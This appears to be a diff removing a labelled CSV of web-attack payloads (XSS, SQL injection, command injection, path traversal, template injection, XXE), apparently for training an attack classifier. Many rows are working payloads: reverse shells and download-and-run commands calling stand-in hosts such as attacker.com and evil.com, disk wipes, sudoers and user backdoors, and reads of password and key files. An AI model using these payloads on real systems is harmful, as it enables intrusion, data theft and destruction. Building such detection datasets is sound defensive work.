@@ -1,600 +1,1213 @@
-"text","label"
-"<script>alert('XSS')</script>","XSS"
-"<img src=x onerror=alert(1)>","XSS"
-"<svg/onload=alert(1)>","XSS"
-"<iframe src='javascript:alert(1)'></iframe>","XSS"
-"<a onmouseover=alert(1)>XSS</a>","XSS"
-"<script>document.cookie</script>","XSS"
-"<script src=http://evil.com/xss.js></script>","XSS"
-"<body onload=alert('XSS')>","XSS"
-"<input onfocus=alert(1) autofocus>","XSS"
-"<select onfocus=alert(1) autofocus>","XSS"
-"<textarea onfocus=alert(1) autofocus>","XSS"
-"<keygen onfocus=alert(1) autofocus>","XSS"
-"<video><source onerror=alert(1)>","XSS"
-"<audio src=x onerror=alert(1)>","XSS"
-"<details open ontoggle=alert(1)>","XSS"
-"<marquee onstart=alert(1)>","XSS"
-"<meter onmouseover=alert(1)>0</meter>","XSS"
-"<object data=javascript:alert(1)>","XSS"
-"<embed src=javascript:alert(1)>","XSS"
-"<svg><animate onbegin=alert(1) attributeName=x dur=1s>","XSS"
-"<math><mtext><script>alert(1)</script></mtext></math>","XSS"
-"'';!--<XSS>=&{()}","XSS"
-"<IMG SRC=javascript:alert('XSS')>","XSS"
-"<IMG SRC=JaVaScRiPt:alert('XSS')>","XSS"
-"<IMG SRC=`javascript:alert('XSS')`>","XSS"
-"<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>","XSS"
-"<IMG onmouseover=alert('XSS')>","XSS"
-"<BODY ONLOAD=alert('XSS')>","XSS"
-"<BGSOUND SRC=javascript:alert('XSS')>","XSS"
-"<BR SIZE=&{alert('XSS')}>","XSS"
-"<LINK REL=stylesheet HREF=javascript:alert('XSS')>","XSS"
-"<STYLE>@import'http://evil.com/xss.css';</STYLE>","XSS"
-"<META HTTP-EQUIV=refresh CONTENT='0;url=javascript:alert(1)'>","XSS"
-"<IFRAME SRC=javascript:alert('XSS')></IFRAME>","XSS"
-"<FRAMESET><FRAME SRC=javascript:alert('XSS')></FRAMESET>","XSS"
-"<TABLE BACKGROUND=javascript:alert('XSS')>","XSS"
-"<DIV STYLE=width:expression(alert('XSS'))>","XSS"
-"<svg/onload=confirm(1)>","XSS"
-"<img src=x onerror=prompt(1)>","XSS"
-"<body onpageshow=alert(1)>","XSS"
-"<style>@keyframes x{}</style><xss style=animation-name:x onanimationend=alert(1)></xss>","XSS"
-"<iframe src=javascript:alert(1)>","XSS"
-"<input onblur=alert(1) autofocus><input autofocus>","XSS"
-"<math href=javascript:alert(1)>CLICKME</math>","XSS"
-"';alert(1)//","XSS"
-"\;alert(1)//""","XSS"
-"javascript://%250Aalert(1)","XSS"
-"<a href='javascript:alert(1)'>Click</a>","XSS"
-"<form action='javascript:alert(1)'>","XSS"
-"<isindex type=image src=1 onerror=alert(1)>","XSS"
-"<object data='data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='>","XSS"
-"<embed src='data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='>","XSS"
-"%3Cscript%3E","XSS"
-"<svg onload=alert(document.domain)>","XSS"
-"<img src=x onerror=alert(document.cookie)>","XSS"
-"<details open ontoggle=confirm(1)>","XSS"
-"<marquee onfinish=alert(1)>","XSS"
-"<video src=x onerror=alert(1)>","XSS"
-"<xss id=x tabindex=1 onfocus=alert(1)></xss>","XSS"
-"<img src=1 onerror=alert(String.fromCharCode(88,83,83))>","XSS"
-"<svg><set attributeName=onmouseover to=alert(1)>","XSS"
-"<body onscroll=alert(1)><div style=height:9999px></div>","XSS"
-"<form><button formaction=javascript:alert(1)>XSS","XSS"
-"' OR 1=1--","SQLi"
-"1; SELECT * FROM users--","SQLi"
-"UNION SELECT 1,2,3--","SQLi"
-"'; DROP TABLE users--","SQLi"
-"SELECT 1,2,3 FROM users","SQLi"
-"1' OR '1'='1","SQLi"
-"1' OR '1'='1' --","SQLi"
-"1' OR '1'='1' /*","SQLi"
-"admin' --","SQLi"
-"admin' #","SQLi"
-"admin'/*","SQLi"
-"' or 1=1--","SQLi"
-"' or 1=1#","SQLi"
-"' or 1=1/*","SQLi"
-"') or '1'='1--","SQLi"
-"') or ('1'='1--","SQLi"
-"1' ORDER BY 1--","SQLi"
-"1' ORDER BY 2--","SQLi"
-"1' ORDER BY 3--","SQLi"
-"1' GROUP BY 1--","SQLi"
-"1' GROUP BY 2--","SQLi"
-"1' UNION SELECT NULL--","SQLi"
-"1' UNION SELECT NULL,NULL--","SQLi"
-"1' UNION SELECT NULL,NULL,NULL--","SQLi"
-"1' UNION ALL SELECT NULL--","SQLi"
-"1' UNION ALL SELECT NULL,NULL--","SQLi"
-"1' AND 1=2 UNION SELECT NULL--","SQLi"
-"' UNION SELECT password FROM users--","SQLi"
-"' UNION SELECT username,password FROM users--","SQLi"
-"1'; DROP TABLE users--","SQLi"
-"1'; DELETE FROM users--","SQLi"
-"1'; UPDATE users SET password='hacked'--","SQLi"
-"1'; INSERT INTO users VALUES('hacker','pass')--","SQLi"
-"1'; EXEC xp_cmdshell('dir')--","SQLi"
-"1' AND 1=CONVERT(int,(SELECT @@version))--","SQLi"
-"1' AND 1=CAST((SELECT @@version) as int)--","SQLi"
-"1' AND SUBSTRING(@@version,1,1)='M'--","SQLi"
-"1' AND ASCII(SUBSTRING(@@version,1,1))>77--","SQLi"
-"1' WAITFOR DELAY '0:0:5'--","SQLi"
-"1'; WAITFOR DELAY '0:0:5'--","SQLi"
-"1' AND SLEEP(5)--","SQLi"
-"1'; SELECT SLEEP(5)--","SQLi"
-"1' AND BENCHMARK(5000000,MD5('A'))--","SQLi"
-"1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--","SQLi"
-"1' AND IF(1=1,SLEEP(5),0)--","SQLi"
-"1' OR SLEEP(5)--","SQLi"
-"1' RLIKE SLEEP(5)--","SQLi"
-"1' REGEXP SLEEP(5)--","SQLi"
-"admin' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--","SQLi"
-"admin' AND UPDATEXML(1,CONCAT(0x7e,(SELECT version())),1)--","SQLi"
-"1' AND (SELECT COUNT(*) FROM information_schema.tables)>0--","SQLi"
-"1' AND (SELECT COUNT(*) FROM information_schema.columns)>0--","SQLi"
-"1' UNION SELECT table_name FROM information_schema.tables--","SQLi"
-"1' UNION SELECT column_name FROM information_schema.columns--","SQLi"
-"1' UNION SELECT user()--","SQLi"
-"1' UNION SELECT database()--","SQLi"
-"1' UNION SELECT version()--","SQLi"
-"1' UNION SELECT @@version--","SQLi"
-"1' UNION SELECT @@datadir--","SQLi"
-"1' UNION SELECT load_file('/etc/passwd')--","SQLi"
-"1' AND SLEEP(10)--","SQLi"
-"1' AND BENCHMARK(1000000,MD5(1))--","SQLi"
-"1' UNION SELECT null, table_name FROM information_schema.tables--","SQLi"
-"1' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--","SQLi"
-"admin' AND 1=1--","SQLi"
-"admin') OR ('1'='1","SQLi"
-"1 UNION SELECT 1, version(), user()","SQLi"
-"1 OR 1=1 LIMIT 1","SQLi"
-"1; WAITFOR DELAY '0:0:5'","SQLi"
-"1' AND EXTRACTVALUE(1, CONCAT(0x5c, (SELECT user())))--","SQLi"
-"id=-1 UNION SELECT 1, 2, 3, 4","SQLi"
-"(SELECT * FROM users WHERE id=1)","SQLi"
-"1 || (SELECT SLEEP(5))","SQLi"
-"1' OR '1'='1' AND 1=1","SQLi"
-"1 AND 1=1; --","SQLi"
-"%27%20OR%201=1","SQLi"
-"admin'--","SQLi"
-"' or 1=1 limit 1 --","SQLi"
-"' or 1=1 limit 1 #","SQLi"
-"1' order by 1 --","SQLi"
-"1' union select 1,2,3 --","SQLi"
-"1' union select 1,2,3 #","SQLi"
-"1' union select 1,2,3 /*","SQLi"
-"1' union select 1,2,3 limit 1 --","SQLi"
-"1' union select 1,2,3 limit 1 #","SQLi"
-"1' union select 1,2,3 limit 1 /*","SQLi"
-"; ls","COMMAND_INJECTION"
-"; ls -la","COMMAND_INJECTION"
-"; whoami","COMMAND_INJECTION"
-"; id","COMMAND_INJECTION"
-"; pwd","COMMAND_INJECTION"
-"; cat /etc/passwd","COMMAND_INJECTION"
-"; wget http://evil.com/shell.sh","COMMAND_INJECTION"
-"; curl http://evil.com/backdoor","COMMAND_INJECTION"
-"& dir","COMMAND_INJECTION"
-"& whoami","COMMAND_INJECTION"
-"& ipconfig","COMMAND_INJECTION"
-"& netstat -an","COMMAND_INJECTION"
-"| ls","COMMAND_INJECTION"
-"| cat /etc/passwd","COMMAND_INJECTION"
-"| whoami","COMMAND_INJECTION"
-"| id","COMMAND_INJECTION"
-"|| whoami","COMMAND_INJECTION"
-"|| ls -la","COMMAND_INJECTION"
-"|| cat /etc/shadow","COMMAND_INJECTION"
-"`whoami`","COMMAND_INJECTION"
-"`id`","COMMAND_INJECTION"
-"`cat /etc/passwd`","COMMAND_INJECTION"
-"`ls -la`","COMMAND_INJECTION"
-"$(whoami)","COMMAND_INJECTION"
-"$(id)","COMMAND_INJECTION"
-"$(cat /etc/passwd)","COMMAND_INJECTION"
-"$(ls -la)","COMMAND_INJECTION"
-"$(curl http://evil.com)","COMMAND_INJECTION"
-"; nc -e /bin/sh attacker.com 4444","COMMAND_INJECTION"
-"& nc -e cmd.exe attacker.com 4444","COMMAND_INJECTION"
-"| nc attacker.com 4444 -e /bin/bash","COMMAND_INJECTION"
-"; bash -i >& /dev/tcp/attacker.com/4444 0>&1","COMMAND_INJECTION"
-"; python -c 'import socket'","COMMAND_INJECTION"
-"; perl -e 'use Socket'","COMMAND_INJECTION"
-"; ruby -rsocket","COMMAND_INJECTION"
-"; php -r '$sock=fsockopen()'","COMMAND_INJECTION"
-"127.0.0.1; ls","COMMAND_INJECTION"
-"127.0.0.1 && dir","COMMAND_INJECTION"
-"127.0.0.1 | cat /etc/passwd","COMMAND_INJECTION"
-"127.0.0.1 || whoami","COMMAND_INJECTION"
-"8.8.8.8; wget http://evil.com/shell","COMMAND_INJECTION"
-"google.com & netstat","COMMAND_INJECTION"
-"; ping -c 10 127.0.0.1","COMMAND_INJECTION"
-"& ping -n 10 127.0.0.1","COMMAND_INJECTION"
-"| sleep 10","COMMAND_INJECTION"
-"cat /etc/passwd","COMMAND_INJECTION"
-"nc -lvvp 4444","COMMAND_INJECTION"
-"netcat -e /bin/sh 1.2.3.4 80","COMMAND_INJECTION"
-"ping -c 1 127.0.0.1","COMMAND_INJECTION"
-"$(reboot)","COMMAND_INJECTION"
-"`sleep 10`","COMMAND_INJECTION"
-"eval('phpinfo();')","COMMAND_INJECTION"
-"system('id')","COMMAND_INJECTION"
-"; uname -a","COMMAND_INJECTION"
-"& hostname","COMMAND_INJECTION"
-"| ps aux","COMMAND_INJECTION"
-"$(cat /etc/shadow)","COMMAND_INJECTION"
-"`env`","COMMAND_INJECTION"
-"; killall -9 httpd","COMMAND_INJECTION"
-"& tasklist","COMMAND_INJECTION"
-"| ifconfig","COMMAND_INJECTION"
-"$(rm -rf /)","COMMAND_INJECTION"
-"; chmod 777 /etc/passwd","COMMAND_INJECTION"
-"& net user hacker password /add","COMMAND_INJECTION"
-"| iptables -F","COMMAND_INJECTION"
-"$(wget http://evil.com/backdoor.sh -O /tmp/bd.sh && sh /tmp/bd.sh)","COMMAND_INJECTION"
-"; curl http://evil.com/malware | bash","COMMAND_INJECTION"
-"; chown root:root /etc/passwd","COMMAND_INJECTION"
-"& reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Backdoor /t REG_SZ /d C:\\backdoor.exe","COMMAND_INJECTION"
-"| find / -name config.php","COMMAND_INJECTION"
-"$(export PATH=/tmp:$PATH)","COMMAND_INJECTION"
-"`crontab -l`","COMMAND_INJECTION"
-"; systemctl stop firewalld","COMMAND_INJECTION"
-"& sc create backdoor binPath= C:\\backdoor.exe","COMMAND_INJECTION"
-"| mount -t nfs attacker.com:/share /mnt","COMMAND_INJECTION"
-"$(echo 'attacker ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers)","COMMAND_INJECTION"
-"; iptables -A INPUT -p tcp --dport 4444 -j ACCEPT","COMMAND_INJECTION"
-"& powershell -ExecutionPolicy Bypass -File C:\\backdoor.ps1","COMMAND_INJECTION"
-"| useradd -m -s /bin/bash hacker","COMMAND_INJECTION"
-"$(dd if=/dev/zero of=/dev/sda bs=1M)","COMMAND_INJECTION"
-"../../../etc/passwd","PATH_TRAVERSAL"
-"..\\..\\..\\windows\\system32\\config\\sam","PATH_TRAVERSAL"
-"....//....//....//etc/passwd","PATH_TRAVERSAL"
-"..%2F..%2F..%2Fetc%2Fpasswd","PATH_TRAVERSAL"
-"..%252F..%252F..%252Fetc%252Fpasswd","PATH_TRAVERSAL"
-"....\/....\/....\/etc/passwd","PATH_TRAVERSAL"
-"....\/....\/....\/....\/etc/passwd","PATH_TRAVERSAL"
-"..;/..;/..;/etc/passwd","PATH_TRAVERSAL"
-"/app/../../../etc/passwd","PATH_TRAVERSAL"
-"..%c0%af..%c0%af..%c0%afetc/passwd","PATH_TRAVERSAL"
-"..%5c..%5c..%5cwindows%5cwin.ini","PATH_TRAVERSAL"
-"../../../../etc/shadow","PATH_TRAVERSAL"
-"/var/www/html/../../../../etc/hosts","PATH_TRAVERSAL"
-"file:///etc/passwd","PATH_TRAVERSAL"
-"C:\\Windows\\System32\\drivers\\etc\\hosts","PATH_TRAVERSAL"
-"../../../../../../../../../../etc/passwd","PATH_TRAVERSAL"
-"..\..\..\..\..\..\..\..\windows\win.ini","PATH_TRAVERSAL"
-"/etc/passwd%00","PATH_TRAVERSAL"
-"....//....//....//windows/win.ini","PATH_TRAVERSAL"
-"..%c1%9c..%c1%9c..%c1%9cetc/passwd","PATH_TRAVERSAL"
-"..%c0%afetc%c0%afpasswd","PATH_TRAVERSAL"
-"/var/www/../../etc/passwd","PATH_TRAVERSAL"
-"C:/windows/system32/config/sam","PATH_TRAVERSAL"
-"..\\..\\..\\..\\..\\..\\..\\windows\\system32\\config\\sam","PATH_TRAVERSAL"
-"....//....//....//....//etc/passwd%00","PATH_TRAVERSAL"
-"/etc/shadow%00.jpg","PATH_TRAVERSAL"
-"../../../../../../../../../../windows/system32/drivers/etc/hosts","PATH_TRAVERSAL"
-"file:///c:/windows/win.ini","PATH_TRAVERSAL"
-"php://filter/convert.base64-encode/resource=index.php","PATH_TRAVERSAL"
-"php://filter/read=string.rot13/resource=index.php","PATH_TRAVERSAL"
-"zip://shell.zip%23shell.php","PATH_TRAVERSAL"
-"phar://shell.phar/shell.php","PATH_TRAVERSAL"
-"expect://id","PATH_TRAVERSAL"
-"data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=","PATH_TRAVERSAL"
-"/proc/self/environ","PATH_TRAVERSAL"
-"/proc/self/cmdline","PATH_TRAVERSAL"
-"/proc/self/fd/0","PATH_TRAVERSAL"
-"/proc/version","PATH_TRAVERSAL"
-"/proc/net/tcp","PATH_TRAVERSAL"
-"....//....//....//....//....//etc/passwd","PATH_TRAVERSAL"
-"..%252f..%252f..%252f..%252fetc%252fpasswd","PATH_TRAVERSAL"
-"....\/....\/....\/....\/....\/etc/passwd","PATH_TRAVERSAL"
-"..;/..;/..;/..;/etc/passwd","PATH_TRAVERSAL"
-"/app/../../../../../../etc/passwd","PATH_TRAVERSAL"
-"..%c0%af..%c0%af..%c0%af..%c0%afetc/passwd","PATH_TRAVERSAL"
-"..%5c..%5c..%5c..%5cwindows%5cwin.ini","PATH_TRAVERSAL"
-"....//....//....//....//windows/system32/config/sam","PATH_TRAVERSAL"
-"../../../../../../../../../../var/log/apache2/access.log","PATH_TRAVERSAL"
-"file:///var/www/html/../../etc/passwd","PATH_TRAVERSAL"
-"C:\\inetpub\\wwwroot\\..\\..\\..\\..\\windows\\system32\\config\\sam","PATH_TRAVERSAL"
-"/etc/passwd%00.txt","PATH_TRAVERSAL"
-"....//....//....//....//etc/shadow%00","PATH_TRAVERSAL"
-"../../../../../../../../../../usr/local/apache2/conf/httpd.conf","PATH_TRAVERSAL"
-"file:///c:/windows/system32/drivers/etc/hosts","PATH_TRAVERSAL"
-"php://filter/convert.base64-encode/resource=../../../etc/passwd","PATH_TRAVERSAL"
-"zip://upload.zip%23shell.txt","PATH_TRAVERSAL"
-"phar://upload.phar/shell.txt","PATH_TRAVERSAL"
-"expect://ls","PATH_TRAVERSAL"
-"data://text/plain,<?php system($_GET['cmd']); ?>","PATH_TRAVERSAL"
-"/proc/self/fd/1","PATH_TRAVERSAL"
-"/proc/self/fd/2","PATH_TRAVERSAL"
-"/proc/cpuinfo","PATH_TRAVERSAL"
-"/proc/meminfo","PATH_TRAVERSAL"
-"....//....//....//....//....//....//etc/passwd","PATH_TRAVERSAL"
-"..%252f..%252f..%252f..%252f..%252fetc%252fpasswd","PATH_TRAVERSAL"
-"../../../../../../../../../../var/lib/postgresql/data/pg_hba.conf","PATH_TRAVERSAL"
-"file:///usr/local/nginx/conf/nginx.conf","PATH_TRAVERSAL"
-"C:\\xampp\\htdocs\\..\\..\\..\\..\\windows\\system32\\config\\system","PATH_TRAVERSAL"
-"....//....//....//....//....//....//....//etc/passwd","PATH_TRAVERSAL"
-"..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd","PATH_TRAVERSAL"
-"....\/....\/....\/....\/....\/....\/....\/etc/passwd","PATH_TRAVERSAL"
-"..;/..;/..;/..;/..;/..;/etc/passwd","PATH_TRAVERSAL"
-"/app/../../../../../../../../../../etc/passwd","PATH_TRAVERSAL"
-"..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afetc/passwd","PATH_TRAVERSAL"
-"..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini","PATH_TRAVERSAL"
-"....//....//....//....//....//windows/system32/drivers/etc/hosts","PATH_TRAVERSAL"
-"../../../../../../../../../../opt/lampp/etc/httpd.conf","PATH_TRAVERSAL"
-"file:///var/lib/mysql/mysql/user.MYD","PATH_TRAVERSAL"
-"C:\\wamp\\bin\\apache\\apache2.4.46\\conf\\httpd.conf","PATH_TRAVERSAL"
-"${7*7}","SSTI"
-"{{7*7}}","SSTI"
-"{{config}}","SSTI"
-"{{config.items()}}","SSTI"
-"{{request}}","SSTI"
-"{{request.application}}","SSTI"
-"{{''.class.mro()[1].subclasses()}}","SSTI"
-"{{[].__class__.__base__.__subclasses__()}}","SSTI"
-"<#assign ex=object?api.newInstance()>","SSTI"
-"${T(java.lang.Runtime).getRuntime().exec('calc')}","SSTI"
-"{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}","SSTI"
-"{{lipsum.__globals__.os.popen('id').read()}}","SSTI"
-"{{url_for.__globals__.os.popen('id').read()}}","SSTI"
-"{{g.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}","SSTI"
-"${@java.lang.Runtime@getRuntime().exec('calc')}","SSTI"
-"<#assign cmd='freemarker.template.utility.Execute'?new()>${cmd('id')}","SSTI"
-"<%= File.open('/etc/passwd').read %>","SSTI"
-"#{File.read('/etc/passwd')}","SSTI"
-"*{new java.util.Scanner(new java.io.File('/etc/passwd')).useDelimiter('\\Z').next()}","SSTI"
-"{{''.__class__.__mro__[2].__subclasses__()[104].__init__.__globals__['sys'].modules['os'].popen('id').read()}}","SSTI"
-"${T(java.lang.Runtime).getRuntime().exec('bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC9hdHRhY2tlci5jb20vNDQ0NCAwPiYx}|{base64,-d}|{bash,-i}')}","SSTI"
-"{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read()}}","SSTI"
-"{{self._TemplateReference__context.joiner.__init__.__globals__.os.popen('id').read()}}","SSTI"
-"{{self._TemplateReference__context.namespace.__init__.__globals__.os.popen('id').read()}}","SSTI"
-"<#assign ex='freemarker.template.utility.ObjectConstructor'?new()>${ex('java.io.File','/etc/passwd').text}","SSTI"
-"${T(java.nio.file.Files).readAllLines(T(java.nio.file.Paths).get('/etc/passwd'))}","SSTI"
-"<%= IO.popen('id').read %>","SSTI"
-"#{`id`}","SSTI"
-"*{T(java.lang.Runtime).getRuntime().exec('curl http://attacker.com/$(whoami)')}","SSTI"
-"{{''.__class__.__mro__[2].__subclasses__()[214]()._module.__builtins__['__import__']('subprocess').check_output('id',shell=True)}}","SSTI"
-"${T(org.springframework.util.StreamUtils).copyToString(T(java.lang.Runtime).getRuntime().exec('id').getInputStream(),T(java.nio.charset.Charset).defaultCharset())}","SSTI"
-"{{dict.__base__.__subclasses__()[104].__init__.__globals__['sys'].modules['os'].popen('id').read()}}","SSTI"
-"{{''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['sys'].modules['os'].popen('whoami').read()}}","SSTI"
-"${T(javax.script.ScriptEngineManager).newInstance().getEngineByName('JavaScript').eval('java.lang.Runtime.getRuntime().exec(\calc\"")')}""","SSTI"
-"{{config.__class__.__init__.__globals__['os'].popen('whoami').read()}}","SSTI"
-"<%= system('id') %>","SSTI"
-"#{T(java.lang.Runtime).getRuntime().exec('calc')}","SSTI"
-"*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('whoami').getInputStream())}","SSTI"
-"{{7*'7'}}","SSTI"
-"${7*'7'}","SSTI"
-"<%= 7*'7' %>","SSTI"
-"{{request.application.__globals__.__builtins__.__import__('subprocess').check_output('id',shell=True)}}","SSTI"
-"{{config.__class__.__init__.__globals__['os'].popen('cat /etc/shadow').read()}}","SSTI"
-"{{''.__class__.__mro__[1].__subclasses__()[396]('whoami',shell=True,stdout=-1).communicate()}}","SSTI"
-"${T(java.lang.Runtime).getRuntime().exec('wget http://evil.com/shell.sh -O /tmp/s.sh && bash /tmp/s.sh')}","SSTI"
-"<#assign ex='freemarker.template.utility.Execute'?new()>${ex('wget http://evil.com/backdoor')}","SSTI"
-"{{request.application.__globals__.__builtins__.__import__('os').system('nc -e /bin/sh attacker.com 4444')}}","SSTI"
-"{{config.__class__.__init__.__globals__['os'].popen('curl http://evil.com/malware | bash').read()}}","SSTI"
-"<%= `whoami` %>","SSTI"
-"#{system('id')}","SSTI"
-"*{T(java.lang.Runtime).getRuntime().exec('cmd /c calc')}","SSTI"
-"{{7**7}}","SSTI"
-"${7**7}","SSTI"
-"{{request.__class__}}","SSTI"
-"{{request.__class__.__mro__}}","SSTI"
-"{{request.__class__.__mro__[1]}}","SSTI"
-"{{''.__class__.__bases__[0].__subclasses__()}}","SSTI"
-"{{get_flashed_messages.__globals__.__builtins__.open('/etc/passwd').read()}}","SSTI"
-"{{cycler.__init__.__globals__.os.popen('id').read()}}","SSTI"
-"{{joiner.__init__.__globals__.os.popen('id').read()}}","SSTI"
-"{{namespace.__init__.__globals__.os.popen('id').read()}}","SSTI"
-"${T(java.lang.System).getenv()}","SSTI"
-"${T(java.lang.System).getProperty('user.dir')}","SSTI"
-"{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}","SSTI"
-"<#assign ex='freemarker.template.utility.Execute'?new()>${ex('cat /etc/passwd')}","SSTI"
-"${T(java.lang.Runtime).getRuntime().exec('whoami')}","SSTI"
-"{{request.application.__globals__.__builtins__.__import__('os').popen('whoami').read()}}","SSTI"
-"{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/shadow').read()}}","SSTI"
-"<%= 7*7 %>","SSTI"
-"*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('id').getInputStream())}","SSTI"
-"{{''.__class__.__mro__[2].__subclasses__()[59]()._module.__builtins__['__import__']('os').system('id')}}","SSTI"
-"{{request.application.__globals__.__builtins__.eval(\__import__('os').popen('id').read()\"")}}""","SSTI"
-"{{config.__class__.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}","SSTI"
-"${@java.lang.System@getProperty('java.version')}","SSTI"
-"<%= File.read('/etc/shadow') %>","SSTI"
-"#{File.open('/etc/passwd').read}","SSTI"
-"*{new String(T(java.nio.file.Files).readAllBytes(T(java.nio.file.Paths).get('/etc/passwd')))}","SSTI"
-"{{''.__class__.__mro__[2].__subclasses__()[104].__init__.__globals__['sys'].modules['subprocess'].check_output('whoami',shell=True)}}","SSTI"
-"${T(java.lang.Runtime).getRuntime().exec('bash -c whoami')}","SSTI"
-"<#assign ex='freemarker.template.utility.Execute'?new()>${ex('ls -la')}","SSTI"
-"<%= `ls -la` %>","SSTI"
-"{{''.__class__.__mro__[2].__subclasses__()[214]()._module.__builtins__['__import__']('os').popen('whoami').read()}}","SSTI"
-"<xml><!DOCTYPE test [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><test>&xxe;</test>","XXE"
-"<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///c:/windows/win.ini'>]>","XXE"
-"<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'http://evil.com/xxe'>]>","XXE"
-"<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/hostname'>]><foo>&xxe;</foo>","XXE"
-"<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'http://attacker.com/xxe.dtd'>]><foo>&xxe;</foo>","XXE"
-"<?xml version='1.0'?><!DOCTYPE data [<!ENTITY file SYSTEM 'php://filter/convert.base64-encode/resource=index.php'>]><data>&file;</data>","XXE"
-"<!DOCTYPE foo [<!ENTITY % xxe SYSTEM 'file:///etc/passwd'><!ENTITY % dtd SYSTEM 'http://attacker.com/evil.dtd'>%dtd;]>","XXE"
-"<?xml version='1.0' encoding='UTF-8'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'expect://id'>]><foo>&xxe;</foo>","XXE"
-"<!DOCTYPE x [ <!ENTITY xxe SYSTEM 'file:///etc/passwd'> ]><r>&xxe;</r>","XXE"
-"<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/shadow'>]><foo>&xxe;</foo>","XXE"
-"<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///c:/windows/system32/drivers/etc/hosts'>]>","XXE"
-"<?xml version='1.0'?><!DOCTYPE data [<!ENTITY file SYSTEM 'file:///var/www/html/config.php'>]><data>&file;</data>","XXE"
-"<!DOCTYPE foo [<!ENTITY % xxe SYSTEM 'file:///etc/shadow'><!ENTITY % dtd SYSTEM 'http://attacker.com/xxe.dtd'>%dtd;]>","XXE"
-"<?xml version='1.0' encoding='UTF-8'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'expect://whoami'>]><foo>&xxe;</foo>","XXE"
-"<!DOCTYPE test [<!ENTITY xxe SYSTEM 'file:///proc/self/environ'>]><test>&xxe;</test>","XXE"
-"<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///proc/version'>]><foo>&xxe;</foo>","XXE"
-"<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'php://filter/read=convert.base64-encode/resource=/etc/passwd'>]><foo>&xxe;</foo>","XXE"
-"<?xml version='1.0'?><!DOCTYPE data [<!ENTITY file SYSTEM 'php://filter/convert.base64-encode/resource=/var/www/html/.htaccess'>]><data>&file;</data>","XXE"
-"<!DOCTYPE foo [<!ENTITY % blind SYSTEM 'http://attacker.com/?data=%file;'><!ENTITY % file SYSTEM 'php://filter/convert.base64-encode/resource=/etc/passwd'>%blind;]>","XXE"
-"<?xml version='1.0' encoding='UTF-8'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///c:/boot.ini'>]><foo>&xxe;</foo>","XXE"
-"<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///c:/inetpub/wwwroot/web.config'>]><foo>&xxe;</foo>","XXE"
-"<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///c:/windows/panther/unattend.xml'>]><foo>&xxe;</foo>","XXE"
-"<?xml version='1.0'?><!DOCTYPE data [<!ENTITY file SYSTEM 'file:///c:/program files/apache/conf/httpd.conf'>]><data>&file;</data>","XXE"
-"<!DOCTYPE foo [<!ENTITY % xxe SYSTEM 'file:///c:/users/administrator/desktop/passwords.txt'><!ENTITY % dtd SYSTEM 'http://attacker.com/win.dtd'>%dtd;%xxe;]>","XXE"
-"<?xml version='1.0' encoding='UTF-8'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file://127.0.0.1/c$/windows/win.ini'>]><foo>&xxe;</foo>","XXE"
-"<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///c:/windows/system32/config/sam'>]><foo>&xxe;</foo>","XXE"
-"<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/sudoers'>]><foo>&xxe;</foo>","XXE"
-"<!DOCTYPE foo [<!ENTITY % xxe SYSTEM 'http://attacker.com/xxe.xml'>%xxe;]>","XXE"
-"<?xml version='1.0' encoding='UTF-8'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'expect://ls'>]><foo>&xxe;</foo>","XXE"
-"<!DOCTYPE root [<!ENTITY xxe SYSTEM 'file:///etc/hostname'>]><root>&xxe;</root>","XXE"
-"<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///var/log/apache2/access.log'>]><foo>&xxe;</foo>","XXE"
-"<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///home/user/.ssh/id_rsa'>]><foo>&xxe;</foo>","XXE"
-"<?xml version='1.0'?><!DOCTYPE data [<!ENTITY file SYSTEM 'file:///root/.bash_history'>]><data>&file;</data>","XXE"
-"<!DOCTYPE foo [<!ENTITY % local SYSTEM 'file:///etc/passwd'><!ENTITY % remote SYSTEM 'http://attacker.com/evil.dtd'>%remote;%local;]>","XXE"
